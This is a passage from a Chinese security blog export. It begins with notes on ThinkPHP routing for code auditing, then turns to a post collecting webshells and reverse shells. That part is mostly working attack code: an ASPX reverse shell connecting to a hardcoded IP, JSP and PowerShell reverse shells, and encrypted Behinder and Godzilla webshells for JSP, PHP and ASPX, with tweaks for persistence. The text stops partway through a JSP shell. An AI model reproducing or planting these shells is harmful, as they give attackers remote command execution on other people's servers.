配置文件：ThinkPHP的应用配置文件通常位于application/config.php，在这个文件中可以查看默认模块的设置，或者是模块的相关配置。例如： 12345678return [ // 应用设置 &#x27;app&#x27; =&gt; [ &#x27;default_module&#x27; =&gt; &#x27;index&#x27;, // 默认模块名 &#x27;deny_module_list&#x27; =&gt; [&#x27;common&#x27;], // 禁止访问的模块 ], ...]; URL访问：在未配置特殊路由的情况下，URL的结构通常反映了模块的使用。例如，访问http://yourdomain.com/index/controller/action中的index可能就是模块名。 controller - 控制器名 action - 控制器中的方法名 如果你的控制器是HelloWorld，并且定义如下： 12345678910&lt;?phpnamespace app\\index\\controller;class HelloWorld &#123; public function index() &#123; return &#x27;hello，world！&#x27;; &#125;&#125; 控制器类文件的实际位置是 1application\\index\\controller\\HelloWorld.php 访问url 如果不指定方法名，ThinkPHP 默认会调用控制器中的 index 方法。因此，即使 URL 中没有明确指出要调用 index 方法，系统也会自动寻找并执行 HelloWorld 控制器中的 index() 方法。 12http://localhost/index.php/index/hello_world/index http://localhost/index.php/index/hello_world/ tips：控制器命名和URL映射 在ThinkPHP中，控制器的命名规范是大驼峰（PascalCase），即每个单词的首字母大写。但在URL中，控制器名通常会自动转换为小写，并且驼峰命名中的大写字母会通过下划线(_)进行分隔。所以HelloWorld 控制器在URL中被表示为 hello_world 的原因。 也可以关闭自动转化，以原来的名字Helloworld来进行访问 12// 是否自动转换URL中的控制器和操作名&#x27;url_convert&#x27; =&gt; false, 0x07 参考文章Thinkphp 源码阅读 - Y4er的博客 模块设计 · ThinkPHP5.1完全开发手册 · 看云 (kancloud.cn) 0x08 碎碎念写这篇文章时的碎碎念 👇 我发现我的脑子就像我的笔记一样。脑子里的内容稀碎时，笔记也是。 学习知识是一个闭环的过程。我在学习thinkphp框架的过程是：先把thinkphp的框架文档过了一遍，脑子很乱，但是能僵硬的换出来一些框架流程图。可是生涩不理解，脑子里构建不出来一副完整的画面。学着学着，有点没方向了，我又从路由看起。但是路由进去的时候，走controller。然后我就忽然，脑子灵光一闪，明白了框架的入口到底是个什么意思了。我之前没明白框架入口到底是个什么意思，现在忽然懂了，程序的入口不是route而是框架入口。它规定了路由是怎么走的。然后我就又忽然明白了，thinkphp多路由到底是个什么东西。 学习的时候，如果给你一个“意义”和目的，你就会自己推着自己向前走了。不过这也可能是我忽然探索明白了自己的学习模式。我学习的话，需要一个“意义驱动”。有了这样的驱动，我就有了自己的学习模式和方向。 学习代码审计的时候，我觉得特别没有方向，然后我看见p神说，要从框架底层看起。我就去看文档，不明白意义何在，看的云里雾里。后来我就去问chat森森，为什么要学框架，我想要代码审计，但我不明白我该从哪个方向看起，又要学到什么程度。后来chat森森跟我说“熟悉ThinkPHP或任何其他目标框架的目录结构、核心组件以及其工作方式。这包括了解其路由机制、控制器、模型、视图、中间件和服务提供者”。于是这个时候我的方向就是看路由机制是怎么运行的。看着看着，我自己就找到了方向，自己倒推到了“程序入口”和thinkphp的多路由机制。然后我就想到了y4er的文章。他就是从框架入口start.php 文件开始讲的。 那一刻！我完成了闭环，虽然我还没完全弄懂，但是我有了方向，继续看下去，我就理解了到底是怎么回事。再抽象一点回顾这个学习的过程。我发现这才是我“私人定制”的一种学习方式。我做事情一直都喜欢先把框架定出来，然后再有方向性的填内容进去。","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://gryffinbit.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"thinkphp","slug":"thinkphp","permalink":"https://gryffinbit.top/tags/thinkphp/"}],"author":"Gryffinbit"},{"title":"木马、反弹shell 合集","slug":"木马、反弹shell-合集","date":"2023-12-05T10:10:58.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2023/12/05/木马、反弹shell-合集/","permalink":"https://gryffinbit.top/2023/12/05/%E6%9C%A8%E9%A9%AC%E3%80%81%E5%8F%8D%E5%BC%B9shell-%E5%90%88%E9%9B%86/","excerpt":"","text":"反弹 shellASPX123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;%@ Import Namespace=&quot;System.Runtime.InteropServices&quot; %&gt;&lt;%@ Import Namespace=&quot;System.Net&quot; %&gt;&lt;%@ Import Namespace=&quot;System.Net.Sockets&quot; %&gt;&lt;%@ Import Namespace=&quot;System.Security.Principal&quot; %&gt;&lt;%@ Import Namespace=&quot;System.Data.SqlClient&quot; %&gt;&lt;script runat=&quot;server&quot;&gt;//Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell///Download link: https://www.darknet.org.uk/content/files/InsomniaShell.zip protected void Page_Load(object sender, EventArgs e) &#123; String host = &quot;192.168.28.1&quot;; //CHANGE THIS int port = 1234; ////CHANGE THIS CallbackShell(host, port); &#125; [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO &#123; public int cb; public String lpReserved; public String lpDesktop; public String lpTitle; public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; &#125; [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION &#123; public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId; &#125; [StructLayout(LayoutKind.Sequential)] public struct SECURITY_ATTRIBUTES &#123; public int Length; public IntPtr lpSecurityDescriptor; public bool bInheritHandle; &#125; [DllImport(&quot;kernel32.dll&quot;)] static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation); public static uint INFINITE = 0xFFFFFFFF; [DllImport(&quot;kernel32&quot;, SetLastError = true, ExactSpelling = true)] internal static extern Int32 WaitForSingleObject(IntPtr handle, Int32 milliseconds); internal struct sockaddr_in &#123; public short sin_family; public short sin_port; public int sin_addr; public long sin_zero; &#125; [DllImport(&quot;kernel32.dll&quot;)] static extern IntPtr GetStdHandle(int nStdHandle); [DllImport(&quot;kernel32.dll&quot;)] static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle); public const int STD_INPUT_HANDLE = -10; public const int STD_OUTPUT_HANDLE = -11; public const int STD_ERROR_HANDLE = -12; [DllImport(&quot;kernel32&quot;)] static extern bool AllocConsole(); [DllImport(&quot;WS2_32.dll&quot;, CharSet = CharSet.Ansi, SetLastError = true)] internal static extern IntPtr WSASocket([In] AddressFamily addressFamily, [In] SocketType socketType, [In] ProtocolType protocolType, [In] IntPtr protocolInfo, [In] uint group, [In] int flags ); [DllImport(&quot;WS2_32.dll&quot;, CharSet = CharSet.Ansi, SetLastError = true)] internal static extern int inet_addr([In] string cp); [DllImport(&quot;ws2_32.dll&quot;)] private static extern string inet_ntoa(uint ip); [DllImport(&quot;ws2_32.dll&quot;)] private static extern uint htonl(uint ip); [DllImport(&quot;ws2_32.dll&quot;)] private static extern uint ntohl(uint ip); [DllImport(&quot;ws2_32.dll&quot;)] private static extern ushort htons(ushort ip); [DllImport(&quot;ws2_32.dll&quot;)] private static extern ushort ntohs(ushort ip); [DllImport(&quot;WS2_32.dll&quot;, CharSet=CharSet.Ansi, SetLastError=true)] internal static extern int connect([In] IntPtr socketHandle,[In] ref sockaddr_in socketAddress,[In] int socketAddressSize); [DllImport(&quot;WS2_32.dll&quot;, CharSet = CharSet.Ansi, SetLastError = true)] internal static extern int send( [In] IntPtr socketHandle, [In] byte[] pinnedBuffer, [In] int len, [In] SocketFlags socketFlags ); [DllImport(&quot;WS2_32.dll&quot;, CharSet = CharSet.Ansi, SetLastError = true)] internal static extern int recv( [In] IntPtr socketHandle, [In] IntPtr pinnedBuffer, [In] int len, [In] SocketFlags socketFlags ); [DllImport(&quot;WS2_32.dll&quot;, CharSet = CharSet.Ansi, SetLastError = true)] internal static extern int closesocket( [In] IntPtr socketHandle ); [DllImport(&quot;WS2_32.dll&quot;, CharSet = CharSet.Ansi, SetLastError = true)] internal static extern IntPtr accept( [In] IntPtr socketHandle, [In, Out] ref sockaddr_in socketAddress, [In, Out] ref int socketAddressSize ); [DllImport(&quot;WS2_32.dll&quot;, CharSet = CharSet.Ansi, SetLastError = true)] internal static extern int listen( [In] IntPtr socketHandle, [In] int backlog ); [DllImport(&quot;WS2_32.dll&quot;, CharSet = CharSet.Ansi, SetLastError = true)] internal static extern int bind( [In] IntPtr socketHandle, [In] ref sockaddr_in socketAddress, [In] int socketAddressSize ); public enum TOKEN_INFORMATION_CLASS &#123; TokenUser = 1, TokenGroups, TokenPrivileges, TokenOwner, TokenPrimaryGroup, TokenDefaultDacl, TokenSource, TokenType, TokenImpersonationLevel, TokenStatistics, TokenRestrictedSids, TokenSessionId &#125; [DllImport(&quot;advapi32&quot;, CharSet = CharSet.Auto)] public static extern bool GetTokenInformation( IntPtr hToken, TOKEN_INFORMATION_CLASS tokenInfoClass, IntPtr TokenInformation, int tokeInfoLength, ref int reqLength); public enum TOKEN_TYPE &#123; TokenPrimary = 1, TokenImpersonation &#125; public enum SECURITY_IMPERSONATION_LEVEL &#123; SecurityAnonymous, SecurityIdentification, SecurityImpersonation, SecurityDelegation &#125; [DllImport(&quot;advapi32.dll&quot;, EntryPoint = &quot;CreateProcessAsUser&quot;, SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)] public extern static bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment, String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation); [DllImport(&quot;advapi32.dll&quot;, EntryPoint = &quot;DuplicateTokenEx&quot;)] public extern static bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLeve, TOKEN_TYPE TokenType, ref IntPtr DuplicateTokenHandle); const int ERROR_NO_MORE_ITEMS = 259; [StructLayout(LayoutKind.Sequential)] struct TOKEN_USER &#123; public _SID_AND_ATTRIBUTES User; &#125; [StructLayout(LayoutKind.Sequential)] public struct _SID_AND_ATTRIBUTES &#123; public IntPtr Sid; public int Attributes; &#125; [DllImport(&quot;advapi32&quot;, CharSet = CharSet.Auto)] public extern static bool LookupAccountSid ( [In, MarshalAs(UnmanagedType.LPTStr)] string lpSystemName, IntPtr pSid, StringBuilder Account, ref int cbName, StringBuilder DomainName, ref int cbDomainName, ref int peUse ); [DllImport(&quot;advapi32&quot;, CharSet = CharSet.Auto)] public extern static bool ConvertSidToStringSid( IntPtr pSID, [In, Out, MarshalAs(UnmanagedType.LPTStr)] ref string pStringSid); [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)] public static extern bool CloseHandle( IntPtr hHandle); [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)] public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId); [Flags] public enum ProcessAccessFlags : uint &#123; All = 0x001F0FFF, Terminate = 0x00000001, CreateThread = 0x00000002, VMOperation = 0x00000008, VMRead = 0x00000010, VMWrite = 0x00000020, DupHandle = 0x00000040, SetInformation = 0x00000200, QueryInformation = 0x00000400, Synchronize = 0x00100000 &#125; [DllImport(&quot;kernel32.dll&quot;)] static extern IntPtr GetCurrentProcess(); [DllImport(&quot;kernel32.dll&quot;)] extern static IntPtr GetCurrentThread(); [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)] [return: MarshalAs(UnmanagedType.Bool)] static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions); [DllImport(&quot;psapi.dll&quot;, SetLastError = true)] public static extern bool EnumProcessModules(IntPtr hProcess, [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] [In][Out] uint[] lphModule, uint cb, [MarshalAs(UnmanagedType.U4)] out uint lpcbNeeded); [DllImport(&quot;psapi.dll&quot;)] static extern uint GetModuleBaseName(IntPtr hProcess, uint hModule, StringBuilder lpBaseName, uint nSize); public const uint PIPE_ACCESS_OUTBOUND = 0x00000002; public const uint PIPE_ACCESS_DUPLEX = 0x00000003; public const uint PIPE_ACCESS_INBOUND = 0x00000001; public const uint PIPE_WAIT = 0x00000000; public const uint PIPE_NOWAIT = 0x00000001; public const uint PIPE_READMODE_BYTE = 0x00000000; public const uint PIPE_READMODE_MESSAGE = 0x00000002; public const uint PIPE_TYPE_BYTE = 0x00000000; public const uint PIPE_TYPE_MESSAGE = 0x00000004; public const uint PIPE_CLIENT_END = 0x00000000; public const uint PIPE_SERVER_END = 0x00000001; public const uint PIPE_UNLIMITED_INSTANCES = 255; public const uint NMPWAIT_WAIT_FOREVER = 0xffffffff; public const uint NMPWAIT_NOWAIT = 0x00000001; public const uint NMPWAIT_USE_DEFAULT_WAIT = 0x00000000; public const uint GENERIC_READ = (0x80000000); public const uint GENERIC_WRITE = (0x40000000); public const uint GENERIC_EXECUTE = (0x20000000); public const uint GENERIC_ALL = (0x10000000); public const uint CREATE_NEW = 1; public const uint CREATE_ALWAYS = 2; public const uint OPEN_EXISTING = 3; public const uint OPEN_ALWAYS = 4; public const uint TRUNCATE_EXISTING = 5; public const int INVALID_HANDLE_VALUE = -1; public const ulong ERROR_SUCCESS = 0; public const ulong ERROR_CANNOT_CONNECT_TO_PIPE = 2; public const ulong ERROR_PIPE_BUSY = 231; public const ulong ERROR_NO_DATA = 232; public const ulong ERROR_PIPE_NOT_CONNECTED = 233; public const ulong ERROR_MORE_DATA = 234; public const ulong ERROR_PIPE_CONNECTED = 535; public const ulong ERROR_PIPE_LISTENING = 536; [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)] public static extern IntPtr CreateNamedPipe( String lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr pipeSecurityDescriptor ); [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)] public static extern bool ConnectNamedPipe( IntPtr hHandle, uint lpOverlapped ); [DllImport(&quot;Advapi32.dll&quot;, SetLastError = true)] public static extern bool ImpersonateNamedPipeClient( IntPtr hHandle); [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)] public static extern bool GetNamedPipeHandleState( IntPtr hHandle, IntPtr lpState, IntPtr lpCurInstances, IntPtr lpMaxCollectionCount, IntPtr lpCollectDataTimeout, StringBuilder lpUserName, int nMaxUserNameSize ); protected void CallbackShell(string server, int port) &#123; string request = &quot;Spawn Shell...\\n&quot;; Byte[] bytesSent = Encoding.ASCII.GetBytes(request); IntPtr oursocket = IntPtr.Zero; sockaddr_in socketinfo; oursocket = WSASocket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.IP, IntPtr.Zero, 0, 0); socketinfo = new sockaddr_in(); socketinfo.sin_family = (short) AddressFamily.InterNetwork; socketinfo.sin_addr = inet_addr(server); socketinfo.sin_port = (short) htons((ushort)port); connect(oursocket, ref socketinfo, Marshal.SizeOf(socketinfo)); send(oursocket, bytesSent, request.Length, 0); SpawnProcessAsPriv(oursocket); closesocket(oursocket); &#125; protected void SpawnProcess(IntPtr oursocket) &#123; bool retValue; string Application = Environment.GetEnvironmentVariable(&quot;comspec&quot;); PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION(); STARTUPINFO sInfo = new STARTUPINFO(); SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES(); pSec.Length = Marshal.SizeOf(pSec); sInfo.dwFlags = 0x00000101; sInfo.hStdInput = oursocket; sInfo.hStdOutput = oursocket; sInfo.hStdError = oursocket; retValue = CreateProcess(Application, &quot;&quot;, ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo); WaitForSingleObject(pInfo.hProcess, (int)INFINITE); &#125; protected void SpawnProcessAsPriv(IntPtr oursocket) &#123; bool retValue; string Application = Environment.GetEnvironmentVariable(&quot;comspec&quot;); PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION(); STARTUPINFO sInfo = new STARTUPINFO(); SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES(); pSec.Length = Marshal.SizeOf(pSec); sInfo.dwFlags = 0x00000101; IntPtr DupeToken = new IntPtr(0); sInfo.hStdInput = oursocket; sInfo.hStdOutput = oursocket; sInfo.hStdError = oursocket; if (DupeToken == IntPtr.Zero) retValue = CreateProcess(Application, &quot;&quot;, ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo); else retValue = CreateProcessAsUser(DupeToken, Application, &quot;&quot;, ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo); WaitForSingleObject(pInfo.hProcess, (int)INFINITE); CloseHandle(DupeToken); &#125; &lt;/script&gt; JSP1&lt;%@page import=&quot;java.lang.*,java.util.*,java.io.*,java.net.*&quot;%&gt;&lt;%class StreamConnector extends Thread&#123;InputStream is;OutputStream os;StreamConnector(InputStream is,OutputStream os)&#123;this.is=is;this.os=os;&#125;public void run()&#123;BufferedReader in=null;BufferedWriter out=null;try&#123;in=new BufferedReader(new InputStreamReader(this.is));out=new BufferedWriter(new OutputStreamWriter(this.os));char buffer[]=new char[8192];int length;while((length=in.read(buffer,0,buffer.length))&gt;0)&#123;out.write(buffer,0,length);out.flush();&#125;&#125;catch(Exception e)&#123;&#125;try&#123;if(in!=null)in.close();if(out!=null)out.close();&#125;catch(Exception e)&#123;&#125;&#125;&#125;try&#123;Socket socket=new Socket(&quot;` + addr + `&quot;,` + rp + `);Process process=Runtime.getRuntime().exec(&quot;cmd.exe&quot;);(new StreamConnector(process.getInputStream(),socket.getOutputStream())).start();(new StreamConnector(socket.getInputStream(),process.getOutputStream())).start();&#125;catch(Exception e)&#123;&#125;%&gt; PHP1phpCode = `system(base64_decode(&quot;` + base64EncodeG73gbY37RF(&quot;powershell -nop -c \\&quot;$client = New-Object System.Net.Sockets.TCPClient(&#x27;&quot;+addr+&quot;&#x27;,&quot;+rp+&quot;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()\\&quot;&quot;) + `&quot;));` webshell (AES_BASE64)冰蝎jsp改了导入的类 1&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*,java.nio.charset.StandardCharsets&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte[] b)&#123;return super.defineClass(null,b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(Cipher.DECRYPT_MODE,new SecretKeySpec(k.getBytes(StandardCharsets.UTF_8),&quot;AES&quot;));byte[] decodedBytes=Base64.getDecoder().decode(request.getReader().readLine());new U(this.getClass().getClassLoader()).g(c.doFinal(decodedBytes)).newInstance().equals(pageContext);&#125; %&gt; 原始 1&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt; PHP1&lt;?php @error_reporting(0);session_start();$key=&quot;e45e329feb5d925b&quot;;$_SESSION[&quot;k&quot;]=$key;session_write_close();$post=file_get_contents(&quot;php://input&quot;);if(!extension_loaded(&quot;openssl&quot;))&#123;$t=&quot;base64_&quot;.&quot;decode&quot;;$post=$t($post.&quot;&quot;);for($i=0;$i&lt;strlen($post);$i++)&#123;$post[$i]=$post[$i]^$key[$i+1&amp;15];&#125;&#125;else&#123;$post=openssl_decrypt($post,&quot;AES128&quot;,$key);&#125;$arr=explode(&quot;|&quot;,$post);$func=$arr[0];$params=$arr[1];class C&#123;public function __invoke($p)&#123;eval($p.&quot;&quot;);&#125;&#125;@call_user_func(new C(),$params);?&gt; ASPX1&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;%@Import Namespace=&quot;System.Reflection&quot;%&gt;&lt;%Session.Add(&quot;k&quot;,&quot;e45e329feb5d925b&quot;);byte[] k = Encoding.Default.GetBytes(Session[0] + &quot;&quot;),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(&quot;U&quot;).Equals(this); %&gt; 哥斯拉ASPX原始的马遇见的问题是：服务器正常上传，正常解析200，但是链接失败 持久化问题，将 session 改成 Application 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;%@ Page Language=&quot;C#&quot;%&gt;&lt;%try &#123; string key = &quot;3c6e0b8a9c15224a&quot;; string pass = &quot;pass&quot;; string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace(&quot;-&quot;, &quot;&quot;); byte[] data = System.Convert.FromBase64String(Context.Request[pass]); data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length); if (Application[&quot;payload&quot;] == null) &#123; Application[&quot;payload&quot;] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod(&quot;Load&quot;, new System.Type[] &#123; typeof(byte[]) &#125;).Invoke(null, new object[] &#123; data &#125;); &#125; else &#123; System.IO.MemoryStream outStream = new System.IO.MemoryStream(); object o = ((System.Reflection.Assembly)Application[&quot;payload&quot;]).CreateInstance(&quot;LY&quot;); o.Equals(Context); o.Equals(outStream); o.Equals(data); o.ToString(); byte[] r = outStream.ToArray(); Context.Response.Write(md5.Substring(0, 16)); Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16)); &#125; &#125; catch (System.Exception) &#123; &#125;%&gt;------------------------------------------------------------------易读版本 ------------------------------------------------------------------&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;%try&#123; string key = &quot;3c6e0b8a9c15224a&quot;; string pass = &quot;pass&quot;; string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace(&quot;-&quot;, &quot;&quot;); byte[] data = System.Convert.FromBase64String(Context.Request[pass]); data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length); if (Application[&quot;payload&quot;] == null) &#123; Application[&quot;payload&quot;] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod(&quot;Load&quot;, new System.Type[] &#123; typeof(byte[]) &#125;).Invoke(null, new object[] &#123; data &#125;); &#125; else &#123; System.IO.MemoryStream outStream = new System.IO.MemoryStream(); object o = ((System.Reflection.Assembly)Application[&quot;payload&quot;]).CreateInstance(&quot;LY&quot;); o.Equals(Context); o.Equals(outStream); o.Equals(data); o.ToString(); byte[] r = outStream.ToArray(); Context.Response.Write(md5.Substring(0, 16)); Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16)); &#125;&#125;catch (System.Exception)&#123;&#125;%&gt; 在C#中，Session和Application都是ASP.NET中的对象，用于在Web应用程序中存储和共享数据，但它们的使用方式和作用有所不同。 Session: Session对象用于在用户会话之间存储和检索数据。每个用户在访问应用程序时都有一个唯一的会话ID，而Session对象允许您在用户的整个会话期间存储和检索特定于该用户的数据。 Session通常用于存储用户特定的信息，例如登录状态、购物车内容等。 通过HttpContext.Current.Session可以访问Session对象。 示例： 123456csharpCopy code// 存储数据到SessionHttpContext.Current.Session[&quot;UserName&quot;] = &quot;JohnDoe&quot;;// 从Session中检索数据string userName = (string)HttpContext.Current.Session[&quot;UserName&quot;]; Application: Application对象用于在整个应用程序域（Application Domain）中存储和检索数据。应用程序域是一个隔离的执行环境，对于整个应用程序只有一个实例。 Application对象的数据在所有用户之间共享，因此需要小心使用，以避免并发问题和竞态条件。 Application通常用于存储全局配置信息、计数器等对整个应用程序有意义的数据。 示例： 123456csharpCopy code// 存储数据到ApplicationApplication[&quot;TotalVisitors&quot;] = 1000;// 从Application中检索数据int totalVisitors = (int)Application[&quot;TotalVisitors&quot;]; 总的来说，Session用于在用户会话之间存储和检索数据，而Application用于在整个应用程序中存储和检索数据。在使用它们时，要考虑到数据的范围和共享的需求，以确保安全和有效地管理数据。 Session和Application与持久化的关系主要体现在它们的生命周期和数据保存的持久性方面。 Session: Session对象通常存储在服务器的内存中，它的生命周期与用户的会话期间相同。当用户关闭浏览器或会话过期时，Session数据通常被销毁。 如果需要在会话之间保持Session数据的状态，可以选择使用某种形式的持久化机制，如将Session数据存储在数据库中或使用其他外部存储。 Application: Application对象的数据也存储在服务器的内存中，但其生命周期更长，与应用程序域的生命周期相同。它在应用程序启动时被创建，在应用程序关闭时被销毁。 与Session不同，Application数据的持久性更高，但仍然是限定在应用程序域的生命周期内的，不会跨越多个应用程序域。 在需要更长时间保留数据的情况下，可以考虑使用更持久的存储机制，例如数据库、文件系统等。这确保了数据在应用程序重新启动时仍然可用。 总体而言，Session和Application对象本身在内存中存储数据，但开发人员需要根据具体需求决定是否需要使用持久化机制来确保数据的长期存储和可访问性。 1&lt;%@ Page Language=\\&quot;C#\\&quot; %&gt;&lt;%= \\&quot;Hello, World!\\&quot; %&gt; 1&lt;%@ Page Language=\\&quot;C#\\&quot;%&gt;&lt;%@ Import Namespace=\\&quot;System.IO\\&quot;%&gt;&lt;% Response.Write(\\&quot;hello\\&quot;); %&gt; PHP1&lt;?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K)&#123; for($i=0;$i&lt;strlen($D);$i++) &#123; $c = $K[$i+1&amp;15]; $D[$i] = $D[$i]^$c; &#125; return $D; &#125; $pass=&quot;pass&quot;; $payloadName=&quot;payload&quot;; $key=&quot;3c6e0b8a9c15224a&quot;; if (isset($_POST[$pass]))&#123; $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName]))&#123; $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,&quot;getBasicsInfo&quot;)===false)&#123; $payload=encode($payload,$key); &#125; eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); &#125;else&#123; if (strpos($data,&quot;getBasicsInfo&quot;)!==false)&#123; $_SESSION[$payloadName]=encode($data,$key);&#125;&#125;&#125;?&gt; 1&lt;?php echo &quot;hello&quot;; ?&gt; JSP1&lt;%! String xc=&quot;3c6e0b8a9c15224a&quot;; String pass=&quot;pass&quot;; String md5=md5(pass+xc); class X extends ClassLoader&#123;public X(ClassLoader z)&#123;super(z);&#125;public Class Q(byte[] cb)&#123;return super.defineClass(cb, 0, cb.length);&#125; &#125;public byte[] x(byte[] s,boolean m)&#123; try&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new 